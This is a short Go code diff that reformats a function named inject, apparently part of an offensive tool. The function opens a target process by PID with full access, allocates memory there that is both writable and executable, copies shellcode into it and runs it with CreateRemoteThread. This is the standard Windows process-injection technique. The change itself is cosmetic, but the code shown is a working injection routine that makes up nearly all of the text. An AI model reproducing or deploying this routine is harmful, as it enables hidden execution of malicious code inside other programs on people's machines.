@@ -65,10 +65,26 @@ func inject(shellcode []byte, pid uint32) {
     closehandle := kernel32.MustFindProc("CloseHandle")
     
     // inject & execute shellcode in target process' space
-    processHandle, _, _ := openproc.Call(PROCESS_ALL_ACCESS, 0, uintptr(pid))
-    remote_buf, _, _ := vallocex.Call(processHandle, 0, uintptr(len(shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-    writeprocmem.Call(processHandle, remote_buf, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
-    createremthread.Call(processHandle, 0, 0, remote_buf, 0, 0, 0)
+    processHandle, _, _ := openproc.Call(PROCESS_ALL_ACCESS,
+                                         0,
+                                         uintptr(pid))
+    remote_buf, _, _ := vallocex.Call(processHandle,
+                                      0,
+                                      uintptr(len(shellcode)),
+                                      MEM_COMMIT,
+                                      PAGE_EXECUTE_READWRITE)
+    writeprocmem.Call(processHandle,
+                      remote_buf,
+                      uintptr(unsafe.Pointer(&shellcode[0])),
+                      uintptr(len(shellcode)),
+                      0)
+    createremthread.Call(processHandle,
+                         0,
+                         0,
+                         remote_buf,
+                         0,
+                         0,
+                         0)
     closehandle.Call(processHandle)
 }
 
